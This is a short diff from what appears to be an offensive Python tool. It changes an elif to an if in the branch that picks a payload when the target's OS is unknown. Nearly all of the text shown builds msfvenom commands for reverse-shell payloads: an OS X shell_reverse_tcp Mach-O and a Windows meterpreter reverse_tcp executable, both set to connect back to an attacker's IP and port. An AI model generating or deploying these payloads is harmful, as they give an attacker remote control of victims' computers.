@@ -203,7 +203,7 @@ elif osInfo.find("osx") != -1:
     print(os)
     payload = ("msfvenom -p osx/x86/shell_reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f macho -o"+ filename)
 
-elif os == "":
+if os == "":
     print("[*] Unable to profile OS, defaulting to Windows.")
     os = "windows"
     payload = ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f exe -o"+ filename)
